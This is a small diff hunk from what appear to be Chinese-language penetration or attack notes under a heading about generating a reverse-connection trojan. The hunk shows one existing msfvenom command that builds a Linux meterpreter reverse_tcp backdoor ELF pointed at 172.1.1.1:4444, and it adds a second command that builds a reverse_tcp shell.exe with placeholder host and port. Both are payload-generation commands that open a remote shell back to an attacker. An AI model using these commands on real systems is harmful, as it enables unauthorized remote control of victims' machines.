@@ -30,6 +30,9 @@ crontab -e
 生成反弹木马
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.1.1.1 LPORT=4444 -f elf -o backdoor.elf
+
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe -o shell.exe
 ```
 
 ```
